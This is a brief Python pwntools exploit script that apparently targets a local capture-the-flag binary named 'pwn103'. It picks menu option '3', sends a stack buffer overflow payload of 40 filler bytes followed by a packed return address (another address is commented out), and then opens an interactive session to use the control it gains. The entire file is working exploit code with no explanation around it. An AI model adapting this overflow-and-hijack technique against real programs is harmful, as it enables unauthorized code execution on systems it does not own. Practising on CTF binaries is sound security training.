from pwn import *

p = process("./pwn103.pwn103")

p.sendline(b"3")

payload = b"A"*40
#payload += p32(0x0000000000401377) 
payload += p32(0x0000000000401554)

p.sendline(payload)
p.recv()

p.interactive()